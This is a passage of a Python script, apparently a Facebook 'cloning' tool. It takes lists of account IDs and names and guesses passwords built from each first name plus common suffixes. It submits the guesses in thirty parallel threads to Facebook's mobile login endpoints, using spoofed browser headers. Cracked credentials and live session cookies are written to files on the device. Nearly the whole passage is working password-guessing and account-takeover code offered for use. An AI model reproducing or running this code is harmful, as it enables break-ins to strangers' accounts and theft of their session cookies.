            animation(' [×] TRY AGAIN ')
            os.system('clear')
    try:
        print('\033[0;91m==================')
        print(f' \033[92;1m[\033[92;1m•\033[92;1m] TOTAL ID : \u001b[36m'+str(len(id))+'\033[1;37m')
        setting()
    except requests.exceptions.ConnectionError:
        print(f'{u}')
        back()
    except (KeyError,IOError):
        print('\033[0;91m==================')
        animation(" [×] DUMP ID FAILED ")
        time.sleep(3)
        back()
 
#-------------[ CRACK-FROM-FILE ]------------------#
 
def crack_file():
    print('\033[0;93m==================')
    os.system('espeak -a 300 " your file name"')
    print('\033[1;36m[ Put File Example:  /sdcard/BLACK.txt  Etc...]')
    o = input('\033[95;1m[\033[92;1m+\033[95;1m] INPut FILE NAME :\033[95;1m ')
    try:lin = open(o).read().splitlines()
    except:
        print('\033[0;98m==================')
        animation(' [×] FILE NOT FOUND')
        time.sleep(2)
        back()
    for xid in lin:
        id.append(xid)
    setting()
 
#-------------[ PENGATURAN-IDZ ]---------------#
 
def setting():
    print('\033[0;91m=============================')
    print("\033[95;1m[\033[95;1m1\033[95;1m] \033[0;95mCLONING FOR ONLY 𝐎𝐋𝐃 IDz")
    print("\033[98;1m[\033[98;1m2\033[98;1m] \033[0;98mCLONING FOR ONLY 𝐍𝐄𝐖 IDz")
    print("\033[91;1m[\033[91;1m3\033[91;1m] \033[0;91mCLONING FOR 𝐌𝐈𝐗 IDz")
    print('\033[0;91m=============================')
    hu = input('\033[95;1m[\033[92;1m+\033[95;1m]CHOOSE :\033[95;1m ')
    if hu in ['1','01']:
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ['2','02']:
        muda=[] 
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif hu in ['3','03']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    print('\033[0;91m==================')
    print('\033[0;91m==================')
    print("\033[98;1m[\033[98;1m1\033[98;1m] METHOD 1 [\035𝐍𝐞𝐰 𝐕𝐞𝐫𝐬𝐢𝐨𝐧\033[1;37m]")
    print("\033[93;1m[\033[93;1m2\033[93;1m] METHOD 2 [\034𝐎𝐥𝐝 𝐕𝐞𝐫𝐬𝐢𝐨𝐧\033[1;37m]")
    print('\033[0;91m==================')
    hc = input('\033[95;1m[\033[92;1m•\033[95;1m] CHOOSE : ')
    if hc in ['1','01']:
        method.append('mobile')
    elif hc in ['2','02']:
        method.append('free')
    else:
        method.append('mobile')
    passwrd()
    exit() 
    
def CYBER(idf):
    if len(idf)==15:
        if idf[:10] in ['1000000000']       :mafiya = ' 2009'
        elif idf[:9] in ['100000000']       :mafiya = '~> 2009'
        elif idf[:8] in ['10000000']        :mafiya = '~> 2009'
        elif idf[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:mafiya = '~> 2009'
        elif idf[:7] in ['1000006','1000007','1000008','1000009']:mafiya = ' 2010'
        elif idf[:6] in ['100001']          :mafiya = '~> 2010/2011'
        elif idf[:6] in ['100002','100003'] :mafiya = '~> 2011/2012'
        elif idf[:6] in ['100004']          :mafiya = '~> 2012/2013'
        elif idf[:6] in ['100005','100006'] :mafiya = '~> 2013/2014'
        elif idf[:6] in ['100007','100008'] :mafiya = '~> 2014/2015'
        elif idf[:6] in ['100009']          :mafiya = '~> 2014/2015'
        elif idf[:5] in ['10001']           :mafiya = '~> 2015/2016'
        elif idf[:5] in ['10002']           :mafiya = '~> 2016/2017'
        elif idf[:5] in ['10003']           :mafiya = '~> 2018/2019'
        elif idf[:5] in ['10004']           :mafiya = '~> 2019/2020'
        elif idf[:5] in ['10005']           :mafiya = '~> 2020'
        elif idf[:5] in ['10006','10007','']:mafiya = '~> 2021'
        elif idf[:5] in ['10008']           :mafiya = '~> 2022'
        elif idf[:5] in ['10009','6155']       :mafiya = '~> 2023'
        else:mafiya=''
    elif len(idf) in [9,10]:
        mafiya= '~> 2008/2009'
    elif len(idf)==8:
        mafiya = '~> 2007/2008'
    elif len(idf)==7:
        mafiya = '~> 2006/2007'
    else:mafiya=''
    return mafiya
 
#-------------------[ BAGIAN-WORDLIST ]------------#
 
def passwrd():
    os.system('clear')
    print(logo)
    print(f"\033[1;91m[\033[1;91m√\033[1;91m] \033[1;91m𝐘𝐎𝐔𝐑 𝐓𝐎𝐎𝐋𝐒 𝙰𝙲𝚃𝙸𝚅𝙴 \x1b[38;5;50m[𝙿𝚁𝙴𝙼𝙸𝚄𝙼] ")
    print(f"\033[1;91m[\033[1;91m√\033[1;91m] \033[1;91m𝐔𝐒𝐄𝐑𝐒 𝐍𝐀𝐌𝐄\033[1;91m :\033[1;96m "+𝚞𝚗𝚊𝚖𝚎)
    print("\033[1;91m[\033[1;92m√\033[1;91m] \033[1;95m𝗧𝗢𝗗𝗔𝗬'𝗦 𝙳𝙰𝚃𝙴 :\x1b[38;5;50m "+𝚍𝚊𝚝𝚎)
    print('\033[1;91m[\033[1;92m√\033[1;91m] \033[1;93m𝚈𝙾𝚄𝚁 TOTAL 𝙸𝙳𝚣 \033[0;97m:\x1b[38;5;50m ',str(len(id)))
    print("\033[1;91m[\033[1;92m√\033[1;91m] \033[1;95m𝗦𝗧𝗔𝗥𝗧𝗘𝗗 𝗬𝗢𝗨𝗥 𝗖𝗟𝗢𝗡𝗜𝗡𝗚 𝗧𝗜𝗠𝗘 \033[0;97m :> \x1b[38;5;50m"+time.strftime("%H:%M")+" "+ tag)
    print("\033[1;91m[\033[1;92m√\033[1;91m] \033[1;91m𝐂𝐋𝐎𝐍𝐈𝐍𝐆 𝐒𝐏𝐄𝐄𝐃 𝐒𝐔𝐏𝐄𝐑 𝐅𝐀𝐒𝐓 ⏩")
    print(f'\033[1;91m[\033[1;92m√\033[1;91m] \033[1;98m𝐔𝐒𝐄=[𝐅𝐋𝐈𝐆𝐇𝐓 𝐌𝐎𝐃𝐄 𝙵𝙾𝚁 𝚂𝙿𝙴𝙴𝙳 𝚄𝙿💙] ')
    print('\x1b[38;5;50m===============================================')
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf)<6:
                if len(frs)<3:
                    pass
                else:                
                    pwv.append(frs+'12')
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'12345')
                    pwv.append(frs+'123456')                    
                    pwv.append(frs+'##')
                    pwv.append(frs+'444')
                    pwv.append(frs+'444@#')
                    pwv.append(nmf)
                    pwv.append(frs)
                    pwv.append(frs+'@123')
                    pwv.append(frs+'@12345')
                    pwv.append(frs+'@12356')
                    pwv.append(frs+'@')
                    pwv.append(frs+'@@')
                    pwv.append(frs+'@@@')
                    pwv.append(frs+'@@@@')
                    pwv.append(frs+'@#')                   
                    pwv.append(frs+'11')
                    pwv.append(frs+'420')
                    pwv.append(frs+'111')
                   
                             
            else:
                if len(frs)<3:
                    pwv.append(nmf)
                else:
                    pwv.append(frs+'12')
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'12345')
                    pwv.append(frs+'123456')                    
                    pwv.append(frs+'##')
                    pwv.append(frs+'444')
                    pwv.append(frs+'444@#')
                    pwv.append(nmf)
                    pwv.append(frs)
                    pwv.append(frs+'@123')
                    pwv.append(frs+'@12345')
                    pwv.append(frs+'@12356')
                    pwv.append(frs+'@')
                    pwv.append(frs+'@@')
                    pwv.append(frs+'@@@')
                    pwv.append(frs+'@@@@')
                    pwv.append(frs+'@#')                   
                    pwv.append(frs+'11')
                    pwv.append(frs+'420')
                    pwv.append(frs+'111')
                    
                    
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            else:pass
            if 'mobile' in method:
                pool.submit(crack,idf,pwv)
            elif 'free' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'touch' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'mbasic' in method:
                pool.submit(crackfree,idf,pwv)
            else:
                pool.submit(crackfree,idf,pwv)
    print('\n\033[1;37m===================================')
    print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
    print('\033[97;1m[\033[92;1m•\033[95;1m] OK :\033[0;92m %s '%(ok))
    print('\033[97;1m[\033[92;1m+\033[96;1m] CP :\033[0;93m %s '%(cp))
    print('\n\033[1;37m===================================')
    woi = input('\033[97;1m[\033[92;1m+\033[95;1m] \033[1;37m ENTER TO BACK')
    os.system("python PAID.py")
    exit() 
#--------------------[ METODE-B-API ]-----------------#
 
def crack(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r\033[100;95m{bo}[BLACK 🔍•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ses = requests.Session()
    for pw in pwv:
        try:
            p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade = {
    'Host': 'm.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'ps_l=0; ps_n=0; datr=T3W_ZbVKliFhDDGkd0ITY0Cm; sb=T3W_ZfFtOrsLJRjWLaSVjkHz; m_pixel_ratio=2; wd=360x566; zsh=ASQr3dCl5CfrDEmfcL-gmGbeFhXCLX1yE9RRe6UObMAr-bzoEkKCRV3aleSNvexm32r-L4d4x74qrVrUaUxP4XBpdV-_rlZVHOQW-vm_zWjkvqGrb8FZAAYymIxMYaFmlwmLHrsKKiSQ6tWn9eL_O61BfWhxFXpTo95hLMD9xD76XFUloxnu4wRoSQPtb3ncZdBA901bu6znj__udW2iroVzkEUIU97XOyjHFr4jZPsdgRcogexxS_awgz2xVzWm-VSEXNID1hEEkTtaFkIkk_W0fZqQLnrMY_goH0_eF-IR_0Ta4hIMiwsKG0kNSVc7aTXjnP8HCr4XeOj8; fr=0wJnRzlUZvmkSi04F..Blv3VP.8w.AAA.0.0.Blv3YN.AWVZewrxrS0',
    'dpr': '2',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"CPH1717"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"7.1.1"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
    'viewport-width': '980',}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print('\033[0;361;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                print(f"\033[33;91m𝐁𝐀𝐃 𝐋𝐔𝐂𝐊╔══➻🖤 \033[38;5;46m𝐔𝐈𝐃      ╔══➻ \033[1;92m{idf} ")
                print(f"\033[33;91m𝐁𝐀𝐃 𝐋𝐔𝐂𝐊╚══➻🖤 \033[38;5;46m𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 ╚══➻ \033[0;91m{pw}")
                print(f"\033[1;32m𝐂𝐫𝐞𝐚𝐭𝐢𝐨𝐧 𝐃𝐚𝐭𝐞 "+CYBER(idf)+"")
                os.system('espeak -a 300 " Sorry,  You,  Have,  Got,  Cp,  Id"')
                open('/sdcard/BLACK-CP.txt', 'a').write( idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print('\033[0;361;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                print(f"\033[33;1m𝐂𝐨𝐧𝐠𝐫𝐚𝐭𝐮𝐥𝐚𝐭𝐢𝐨𝐧𝐬 ╔══➻💙 \033[38;5;96m𝐔𝐈𝐃      ╔══➻\033[38;5;86m {idf} ")
                print(f"\033[33;1m𝐂𝐨𝐧𝐠𝐫𝐚𝐭𝐮𝐥𝐚𝐭𝐢𝐨𝐧𝐬 ╠══➻💚 \033[38;5;96m𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 ╠══➻\033[1;97m {pw}")
                print(f"\033[33;1m𝐂𝐨𝐧𝐠𝐫𝐚𝐭𝐮𝐥𝐚𝐭𝐢𝐨𝐧𝐬 ╚══➻💎 \033[38;5;96m𝐂𝐨𝐨𝐤𝐢𝐞𝐬  ╚══➻ \033[1;92m{kuki}")                
                print(f"\033[1;32m𝐂𝐫𝐞𝐚𝐭𝐢𝐨𝐧 𝐃𝐚𝐭𝐞 "+CYBER(idf)+"")
                print('\033[0;361;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                os.system('espeak -a 300 " Congratulation,  You,  Have,  Got,  Ok,  id"')
                open('/sdcard/BLACK-OK.txt', 'a').write( idf+' • '+pw+' | '+kuki+'\n')
                break
                
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
 
#------------------[ METHODE-MBASIC-2 ]-------------------#
 
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[BLACK 🔍-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ses = requests.Session()
    for pw in pwv:
        try:
            ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print('\033[0;361;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                print(f"\033[33;91m𝐁𝐀𝐃 𝐋𝐔𝐂𝐊╔══➻🖤 \033[38;5;46m𝐔𝐈𝐃      ╔══➻ \033[1;92m{idf} ")
                print(f"\033[33;91m𝐁𝐀𝐃 𝐋𝐔𝐂𝐊╚══➻🖤 \033[38;5;46m𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 ╚══➻ \033[0;91m{pw}")
                print(f"\033[1;32m𝐂𝐫𝐞𝐚𝐭𝐢𝐨𝐧 𝐃𝐚𝐭𝐞 "+CYBER(idf)+"")
                os.system('espeak -a 300 " Sorry,  You,  Have,  Got,  Cp,  Id"')
                open('/sdcard/Fahim-CP.txt', 'a').write( idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print('\033[0;361;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                print(f"\033[33;1m𝐂𝐨𝐧𝐠𝐫𝐚𝐭𝐮𝐥𝐚𝐭𝐢𝐨𝐧𝐬 ╔══➻💙 \033[38;5;96m𝐔𝐈𝐃      ╔══➻\033[38;5;86m {idf} ")
                print(f"\033[33;1m𝐂𝐨𝐧𝐠𝐫𝐚𝐭𝐮𝐥𝐚𝐭𝐢𝐨𝐧𝐬 ╠══➻💚 \033[38;5;96m𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 ╠══➻\033[1;97m {pw}")
                print(f"\033[1;32m𝐂𝐫𝐞𝐚𝐭𝐢𝐨𝐧 𝐃𝐚𝐭𝐞 "+CYBER(idf)+"")
                print('\033[0;361;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                open('/sdcard/BLACK-OK.txt', 'a').write( idf+' • '+pw+'\n')
                os.system('espeak -a 300 " Congratulation,  You,  Have,  Got,  Ok,  id"')
                
                break
                
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
 
#-----------------------[ SYSTEM-CONTROL ]--------------------#
 
if __name__=='__main__':
    pass
menu()